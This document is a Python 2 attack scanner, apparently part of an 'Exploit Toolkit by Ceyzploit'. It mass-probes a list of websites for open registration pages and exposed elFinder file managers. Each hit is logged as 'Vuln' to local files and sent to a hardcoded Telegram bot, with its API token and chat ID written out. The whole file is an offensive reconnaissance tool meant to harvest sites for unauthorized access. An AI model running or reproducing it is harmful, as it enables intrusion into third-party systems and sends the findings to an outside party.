# -*- coding: utf-8 -*-
#####################################
#   Pernah Waras Bot For Wordpress  #
#    Code by h0d3_g4n               #
#   Telegram = @h0d3_g4n            #
#   ICQ = @h0d3_g4n                 #
#   Skype = live:f2c962ccea77ec0    #
#####################################
import requests, re, urllib2, os, sys, codecs, random, base64,json  
from multiprocessing.dummy import Pool                          
from time import time as timer  
import time                 
from platform import system 
from colorama import Fore                               
from colorama import Style                              
from pprint import pprint                               
from colorama import init
from urlparse import urlparse
from bs4 import BeautifulSoup
import warnings
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
reload(sys)  
sys.setdefaultencoding('utf8')
init(autoreset=True)
##########################################################################################
abang = '\033[31m'
ijo = '\033[32m'
kuning = '\033[33m'
biru = '\033[34m'
ungu = '\033[35m'
birumuda = '\033[36m'
grey = '\033[37m'
CEND = '\033[0m' 
year = time.strftime("%y")
month = time.strftime("%m")
headers = {
'Connection': 'close',
'Upgrade-Insecure-Requests': '1',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Sec-Fetch-Site': 'none',
'Sec-Fetch-Mode': 'navigate',
'Sec-Fetch-Dest': 'document',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'en-US,en;q=0.9',

}

#####################################
##########################################################################################
try:
        with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
                ooo = f.read().splitlines()
except IndexError:
        print (abang + 'USAGE: '+sys.argv[0]+' listsite.txt' + CEND)
        pass
ooo = list((ooo))
##########################################################################################
def send_to_telegram(message):
    apiToken = '8126005011:AAHLQC842ld7AobwRcQP9K5SBHg5JMRrGV8'
    chatID = '7181158107'
    apiURL = ('https://api.telegram.org/bot'+ apiToken+'/sendMessage')
    try:
        response = requests.post(apiURL, json={'chat_id': chatID, 'text': message})
    except Exception as e:
        pass
   


def scanners1(url):
    try:
        dancok = ['/admin/register', '/register']
        for asu in dancok:
            get_jembut = requests.get(url + asu, headers=headers, timeout=10, verify=False)
            
            if ('name="password_confirmation"' in get_jembut.content.decode('utf-8') or 
                'type="hidden" name="_token"' in get_jembut.content.decode('utf-8') or 
                'button type="submit"' in get_jembut.content.decode('utf-8')):
                
                print('Target: ' + url + ' ' + birumuda + ':)' + ijo + ' Vuln Register !!' + CEND)
                
                if asu == '/register':
                    with open('regtok.txt', 'a') as reg_file:
                        reg_file.write(url + asu + "\n")
                elif asu == '/admin/register':
                    with open('adminregkuy.txt', 'a') as admin_file:
                        admin_file.write(url + asu + "\n")

                send_to_telegram("ADMIN-REGIS==>" + url + asu)
                break
        else:
            print('Target: ' + url + ' ' + birumuda + ':(' + abang + ' Not Vuln !!' + CEND)
    

    except:
        pass


def scanners2(url):
    try:
        dancok = ['/elfinder', '/plugins/elfinder']  
        for asu in dancok:
            get_jembut = requests.get(url + asu, headers=headers, timeout=10, verify=False)

            content = get_jembut.content.decode('utf-8')

            
            if '<title>elFinder 2.0</title>' in content or "$('#elfinder').elfinder({" in content:
                print('Target: ' + url + ' ' + birumuda + ':)' + ijo + ' Vuln Elfinder !!' + CEND)
                with open('ELfinVuln.txt', 'a') as vuln_file:
                    vuln_file.write(url + asu + "\n")
                send_to_telegram("ELFINDER VULN==>" + url + asu)
                break
        else:
            print('Target: ' + url + ' ' + birumuda + ':(' + abang + ' Not Vuln !!' + CEND)
    

    except:
        pass


#####################################
def logo():
    import random, sys, time
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]
    x = ''' 
                                                                                                                                                                        
                                                                                                                                                                        
                                                                                                               
  @@@@@@@ @@@@@@@@ @@@ @@@ @@@@@@@@ @@@@@@@@ @@@@@@@@ @@@@@@@@ @@@@@@@@ @@@@@@@@
 !@@      @@!      @@! !@@      @@!      @@!      @@!      @@!      @@!      @@!
 !@!      @!!!:!    !@!@!     @!!      @!!      @!!      @!!      @!!      @!!  
 :!!      !!:        !!:    !!:      !!:      !!:      !!:      !!:      !!:    
  :: :: : : :: :::   .:    :.::.: : :.::.: : :.::.: : :.::.: : :.::.: : :.::.: :
                                                                                

        Exploit Toolkit by Ceyzploit
             Stay Curious!
    '''
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)

# Menjalankan logo
logo()

##########################################################################################
def Main():
        try:
                
                start = timer()
                ThreadPool = Pool(10)
                Threads = ThreadPool.map(scanners1, ooo)
                Threads = ThreadPool.map(scanners2, ooo)
                print('TIME TAKE: ' + str(timer() - start) + ' S')
                #send_to_telegram("Bot "+sys.argv[0]+" Finished.\nList : "+sys.argv[1])
        except:
                pass


if __name__ == '__main__':
        Main()

